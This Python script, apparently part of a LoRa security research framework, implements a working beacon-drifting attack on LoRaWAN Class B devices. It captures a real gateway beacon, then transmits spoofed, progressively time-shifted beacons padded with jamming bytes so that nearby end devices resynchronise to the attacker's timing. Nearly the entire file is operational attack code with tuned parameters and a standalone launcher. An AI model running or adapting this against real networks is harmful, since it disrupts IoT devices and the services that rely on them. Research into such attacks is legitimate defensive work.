#!/usr/bin/env python
import argparse
import time
import math
import sys
import gpstime

from chirpotle.context import tpy_from_context
from chirpotle.dissect.base import BCNPayload
from chirpotle.dissect.region import RegionEU868
from chirpotle.tools.beaconclock import next_beacon_ts
from chirpotle.tools import (
  lora_iterframes,
  prompt_module,
  calc_lora_airtime,
  calc_lora_symboltime)

# Here for EU868, from regional parameters 1.1 rev B, section 2.2.8
DEFAULT_CHANNEL = {
  "frequency": 869525000, # Hz
  "codingrate": 5, # 4/5
  "syncword": 0x34,
  "spreadingfactor": 9,
  "bandwidth": 125,
  "invertiqrx": False,
  "invertiqtx": True,
  "explicitheader": False,
}

# Attack parameters
# ----------------------------
# Drift Step.
# Time that the beacon is shifted each beacon period. We are constrained in two
# ways here:
# 1) Beacon-less operation is limited to 120 minutes, which means 56 beacon
#    periods. Within this time, the spoofed beacon must have shifted enough so
#    that the end devices under attack can synchronize to it (so the preamble
#    must not collide with the valid beacon, so that the valid_header interrupt
#    is created by the transceiver) -> lower limit for drift_step
# 2) The drifting must not be too far, as the attack exploits the tolerance of
#    the end device. The preamble of the fake beacon must be sent in a way so
#    that the end device under attack can lock on it in its beacon receive
#    window. -> upper limit for drift_step
# If the node_ed is placed close enough at the end device under attack, only
# point 2) is a real limitation, as point 1) can be overcome simply by
# transmission power.
#
# Maximum drift.
# Should be just enough so that the frame can be received completely by the
# devices under attack, but not much more, so that we can jam the legitimate
# beacon by appending additional bytes to the message. As beacons use implicit
# header mode and the frame length is static, those additional bytes are cut
# off by the receiver.
# Airtime for a 17 byte frame at SF9/125kHz is ~145ms (EU868 beacon)
# Tool for calculation: https://www.loratools.nl/#/airtime
#
# Additional Bytes.
# We extend the frame that the attacking node sends so that it collides with the
# real beacon. We can do so because the frame is sent without physical CRC and
# without explicit header. So the frame length is not part of the frame data,
# and there is no CRC at the end that has to match.

class BeaconDriftAttack:

    def __init__(self, node_ed, region = RegionEU868(), channel = dict(),
            preamble_length = 10, drift_step = None, drift_max = None,
            additional_bytes = None, logfile = sys.stdout,
            bcn_payload = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00]):
        """
        Creates an instance of the attack scenario. Can only be used once. Is
        started by the attack() method and stopped by the abort() method. The
        latter is required as the beacon spoofing will continue indefinitly.

        :param node_ed: The TPy LoRa module near the end device, that is used to
        transmit the malicious beacon
        :param region: The LoRaWAN region to get the beacon structure right
        :param channel: Beaconing channel. Format like the input parameter of
        the set_lora_function of the LoRa TPy module
        :param preamble_length: Preamble length to use
        :paramdrift_step: The step size the beacon should drift each iteration
        (i.e. each beacon period), in microseconds. If not provided, will be
        calculated based on the frame length and be set to 4 symbols
        :param drift_max: The maximum drift relative to the real beacon. In us.
        Will be calculated if not given, based on the length of the beacon
        frame.
        :param additional_bytes: Number of additional jamming bytes appended to
        the spoofed beacon. These bytes are used to also jam the legitimate
        beacon while drifting to increase the chance of success. If not
        provided, it will be calculated based on drift_step, drift_max and the
        airtime of the beacon.
        :param bcn_payload: Six bytes used as the content of the Gateway info
        field. By providing magic numbers, it is possible to differentiate the 
        spoofed and the real beacon on the end device to see whether the attack 
        was successful. Setting it to None leaves the bytes from the attacked 
        gateway unchanged.
        :param logfile: File descriptor to write the output to
        """
        self.node_ed = node_ed
        self.region = region
        self.channel = {**DEFAULT_CHANNEL, **channel}
        self.preamble_length = preamble_length
        self.bcn_payload = list(bcn_payload)
        self.symbol_time = calc_lora_symboltime(self.channel['spreadingfactor'],
            self.channel['bandwidth']) * 1000
        self.drift_step = 2 * self.symbol_time if drift_step is None \
            else drift_step
        if drift_max is None:
            drift_max  = self.symbol_time * 1.1 * (self.preamble_length
                + 4.25 # additional preamble symbols (reverse chirps)
                + self.region.beaconProperties.totalLength)
        self.drift_max = drift_max
        # Calculate the airtime of the beacon in microseconds
        self.airtime_beacon = 1000 * calc_lora_airtime(
            self.region.beaconProperties.totalLength,
            spreadingfactor=self.channel['spreadingfactor'], phy_crc=False,
            bandwidth=self.channel['bandwidth'],
            preamble_length=self.preamble_length,
            codingrate=self.channel['codingrate'], explicitheader=False)
        if additional_bytes is None:
            # Number of additional bytes which are appended to the frame to jam
            # the real beacon, based on the air time of that beacon.
            additional_bytes = math.ceil(
                (self.airtime_beacon / self.symbol_time) # symbol count
                * self.channel['spreadingfactor'] # bits per symbol
                / 8) # bits per byte
        self.additional_bytes = additional_bytes
        self.logfile = logfile
        self.running = True
        self._stats = dict()

    def attack(self):
        try:
            self.running = True
            self.prepare()
            beacon, t = self.search_beacon()
            if beacon is not None:
                self.drift_beacon(beacon, t)
        finally:
            self.running = False

    def abort(self):
        self.running = False

    def prepare(self):
        """
        Preparation of the attack
        """
        print("Parameters:", file=self.logfile)
        print("-----------", file=self.logfile)
        print("Drift Goal:     %10d µs (earlier as the real beacon)" % \
            self.drift_max, file=self.logfile)
        print("Step Size:      %10d µs"% self.drift_step, file=self.logfile)
        print("Symbol Time:    %10d µs"% self.symbol_time, file=self.logfile)
        print("Beacon airtime: %10d µs"% self.airtime_beacon, file=self.logfile)
        print("Added Bytes: %d bytes to jam the valid beacon" % \
            self.additional_bytes, file=self.logfile)
        print(file=self.logfile)
        self.node_ed.standby()
        # No CRC on PHY level
        self.node_ed.set_txcrc(False)
        # Preamble length and channel as configured above
        self.node_ed.set_preamble_length(self.preamble_length)
        self.node_ed.set_lora_channel(**self.channel)
        # Payload length for implicit header frames
        self.node_ed.set_jammer_payload_length(
            self.region.beaconProperties.totalLength)

    def search_beacon(self):
        """
        Phase 1 of the attack: Search real beacon and synchronize to it

        Returns the captured beacon and a rough local time reference of when it
        was received.
        """
        print("Phase 1: Searching beacons...", file=self.logfile)
        print("-----------------------------", file=self.logfile)
        self.node_ed.receive()
        captured_frame = None
        local_time = None
        try:
            while captured_frame is None and self.running:
                time.sleep(0.5)
                for raw_frame in lora_iterframes(self.node_ed):
                    bcn_id = next_beacon_ts(gps=True, \
                        reference=gpstime.gpsnow() - 64)
                    bcn = BCNPayload(raw_frame['payload'], region=self.region)
                    print("Received a new frame:", file=self.logfile)
                    print(bcn.print(2), file=self.logfile)
                    if bcn.gsCRCvalid and bcn.ncCRCvalid:
                        self._stats[bcn_id] = {
                            "state": "searching",
                            "substate": "found",
                            "beacon_ts": int(raw_frame['time_valid_header'] -
                                (self.preamble_length + 4.25)*self.symbol_time)
                        }
                        print("Beacon is valid, using it as reference",
                            file=self.logfile)
                        captured_frame = raw_frame
                        local_time = time.time()
                    else:
                        self._stats[bcn_id] = {
                            "state": "searching",
                            "substate": "found-invalid"
                        }
                        print("Beacon was not valid (CRC), searching again...",
                            file=self.logfile)
        finally:
            self.node_ed.standby()
        return captured_frame, local_time

    def drift_beacon(self, captured_frame, captured_frame_ts):
        """
        Performs the actual beacon-drifting. Must be called after search_beacon

        :param captured_frame: Frame captured in the search_beacon() phase
        :param captured_frame_ts: Local time at which the beacon was captured
        """
        print(file=self.logfile)
        print("Phase 2: Drifting...", file=self.logfile)
        print("--------------------", file=self.logfile)
        drift_total = 0
        last_beacon = BCNPayload(captured_frame['payload'], region=self.region)
        last_ts = int(captured_frame['time_valid_header'] -
            (self.preamble_length + 4.25) * self.symbol_time)

        next_ts_local = captured_frame_ts + 128
        try:
            while self.running:
                t = time.time()
                if next_ts_local - 10 < t:
                    print("Scheduling next beacon:", file=self.logfile)
                    print("  drift_total=%d drift_max=%d drift_step=%d" % \
                        (drift_total, self.drift_max, self.drift_step), \
                        file=self.logfile)

                    # Prepare and print the next beacon
                    next_beacon = BCNPayload(region=self.region)
                    next_beacon.timeRaw = last_beacon.timeRaw + 128
                    next_beacon.infoDesc = last_beacon.infoDesc
                    gsOffset = self.region.beaconProperties.gwSpecificOffset
                    if self.bcn_payload == None:
                        next_beacon[gsOffset+1:gsOffset+7] = \
                            last_beacon[gsOffset+1:gsOffset+7]
                    else:
                        next_beacon[gsOffset+1:gsOffset+7] = self.bcn_payload
                    next_beacon.updateCRC()
                    print(next_beacon.print(2), file=self.logfile)

                    # Calculate the timing of the next transmission
                    next_drift = min(self.drift_step,
                        self.drift_max - drift_total)
                    next_ts = int(last_ts + next_drift) + 128000000
                    next_ts_local = next_ts_local + 128 - next_drift / 1000000

                    # Schedule the beacon
                    raw_payload = list(next_beacon[:]) + \
                        [0x00 for _ in range(self.additional_bytes)]
                    self.node_ed.transmit_frame(raw_payload, sched_time=next_ts)
                    self._stats[next_beacon.timeRaw] = {
                          "state": "drifting" if drift_total < self.drift_max \
                              else "drifted",
                          "drift_total": drift_total,
                          "drift_next": next_drift,
                          "beacon_ts": next_ts
                    }

                    # Update state
                    last_beacon = next_beacon
                    drift_total += next_drift
                    last_ts = next_ts
                    print(file=self.logfile)

                # Wait a beacon period
                time.sleep(0.5)
        finally:
            self.node_ed.standby()

    def get_stats(self, beacon_id):
        return self._stats[beacon_id] if beacon_id in self._stats else \
            {"state": "unknown"}

# Standalone mode
if __name__ == "__main__":
    # Parse arguments
    # ---------------
    parser = argparse.ArgumentParser(description="Beacon Drifting Attack")
    parser.add_argument('--nodeed', dest='node_ed',
        help='TPy LoRa node near the device under attack.' +\
            'Format: <tpy_hostname>:<module_alias>"')
    args = parser.parse_args()

    # Configuration of the nodes
    # ----------------------------
    tc, devices = tpy_from_context()
    print() # empty line below the TPy table

    # Roles
    # ----------------------------
    node_ed = None
    if args.node_ed is not None:
        h, m = args.node_ed.split(":", 1) if ":" in args.node_ed else \
            [None,None]
        if h is None or m is None or h not in tc.nodes:
            print("Invalid node: %s. Use <tpy_hostname>:<module_alias>" % \
                args.node_ed)
        elif m not in tc.nodes[h].modules or tc.node(h).modules[m]!='LoRa':
            print("%s is not a LoRa module." % argparse.node_ed)
        else:
            node_ed = tc.nodes[h][m]
    if node_ed is None:
        node_ed = prompt_module(tc.nodes, "Select a node close to the ED:",
            "LoRa", "transmitter")
        print()

    # Attack
    # ----------------------------
    try:
        beaconAttack = BeaconDriftAttack(node_ed,
            bcn_payload=[0xBA, 0xD0, 0x00, 0xBE, 0xAC, 0x00])
        beaconAttack.attack()
    except KeyboardInterrupt:
        print("Stop requested")
    finally:
        print("Activating standby mode")
        node_ed.standby()
